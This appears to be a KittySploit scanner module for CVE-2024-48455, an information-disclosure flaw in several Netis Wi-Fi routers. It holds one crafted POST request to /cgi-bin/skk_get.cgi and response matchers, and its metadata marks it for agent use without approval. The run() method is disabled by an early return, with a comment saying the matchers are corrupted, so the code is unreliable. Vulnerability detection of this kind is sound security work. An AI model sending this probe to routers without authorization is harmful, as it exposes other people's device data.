#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue in Netis Wifi6 Router NX10 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Netis Wifi Router - Information Disclosure Detection',
        'description': 'An issue in Netis Wifi6 Router NX10 2.0.1.3643 and 2.0.1.3582 and Netis Wifi 11AC Router NC65 3.0.0.3749 and Netis Wifi 11AC Router NC63 3.0.0.3327 and 3.0.0.3503 and Netis Wifi 11AC Router NC21 3.0.0.3800, 3.0.0.3500 and 3.0.0.3329 and Netis Wifi Router MW5360 1.0.1.3442 and 1.0.1.3031 allows a remote attacker to obtain sensitive information via the mode_name, wl_link parameters of the skk_get.cgi component.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'netis', 'router', 'exposure', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://attackerkb.com/topics/L6qgmDIMa1/cve-2024-48455',
            'https://github.com/users/h00die-gr3y/projects/1/views/1',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-48455',
        ],
        'cve': 'CVE-2024-48455',
    }

    def run(self):
        return False  # disabled: corrupted matchers
        path = '/cgi-bin/skk_get.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='mode_name=skk_get&wl_link=0\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('version\\', ':', 'statsList\\')
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Netis Wifi Router - Information Disclosure detected', path=path)
            return True
        return False

